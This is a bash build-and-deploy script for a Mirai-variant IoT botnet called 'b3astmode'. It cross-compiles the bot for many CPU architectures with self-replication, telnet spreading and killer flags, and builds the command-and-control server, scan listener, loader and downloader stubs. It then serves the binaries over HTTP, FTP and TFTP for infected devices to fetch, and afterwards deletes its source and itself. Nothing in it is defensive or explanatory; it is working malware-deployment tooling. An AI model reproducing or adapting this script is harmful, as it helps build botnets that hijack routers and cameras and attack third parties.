#!/bin/bash
echo "EXPORTING PATHS"
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}



rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp
mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/beastmode
mkdir /var/www/html/bins
mv etc/index.html /var/www/html/
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/
go build -o loader/scanListen scanListen.go
echo "Compiling: i586"
compile_bot i586 b3astmode.x86 "-static -DCUM_KILLER -DSELFREP -DMIRAI_TELNET -w"
echo "Compiling: mips"
compile_bot mips b3astmode.mips "-static -DCUM_KILLER -DSELFREP -DMIRAI_TELNET -w"
echo "Compiling: mipsel"
compile_bot mipsel b3astmode.mpsl "-static -DCUM_KILLER -DSELFREP -DMIRAI_TELNET -w"
echo "Compiling: armv4l"
compile_bot armv4l b3astmode.arm "-static -DCUM_KILLER -DSELFREP -DMIRAI_TELNET -w"
echo "Compiling: armv5l"
compile_bot armv5l b3astmode.arm5 "-static -DCUM_KILLER -DSELFREP -DMIRAI_TELNET -w"
echo "Compiling: armv6l"
compile_bot armv6l b3astmode.arm6 "-static -DCUM_KILLER -DSELFREP -DMIRAI_TELNET -w"
echo "Compiling: armv7l"
compile_bot armv7l b3astmode.arm7 "-static -DCUM_KILLER -DSELFREP -DMIRAI_TELNET -w"
echo "Compiling: powerpc"
compile_bot powerpc b3astmode.ppc "-static -DCUM_KILLER -DSELFREP -DMIRAI_TELNET -w"
echo "Compiling: sparc"
compile_bot sparc b3astmode.spc "-static -DCUM_KILLER -DSELFREP -DMIRAI_TELNET -w"
echo "Compiling: m68k"
compile_bot m68k b3astmode.m68k "-static -DCUM_KILLER -DSELFREP -DMIRAI_TELNET -w"
echo "Compiling: sh4"
compile_bot sh4 b3astmode.sh4 "-static -DCUM_KILLER -DSELFREP -DMIRAI_TELNET -w"
echo "Compiling: bot.dbg"
gcc -g bot/*.c -obot.dbg -DDEBUG -w








cp release/b3astmode.* /var/www/html/beastmode
cp release/b3astmode.* /var/ftp
mv release/b3astmode.* /var/lib/tftpboot
rm -rf release

gcc -static -O3 -lpthread -pthread ~/loader/src/*.c -o ~/loader/loader

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.spc
armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm7
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.spc
mv ~/dlr/release/dlr* ~/loader/bins
rm -rf ~/dlr ~/loader/src ~/bot ~/scanListen.go ~/Projects ~/build.sh

#wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
#tar -xvf *.xz
#mv upx*/upx .
#./upx --ultra-brute /var/www/html/beastmode/*
#./upx --ultra-brute /var/lib/tftpboot/*
#rm -rf upx*
rm -rf INSTALL.txt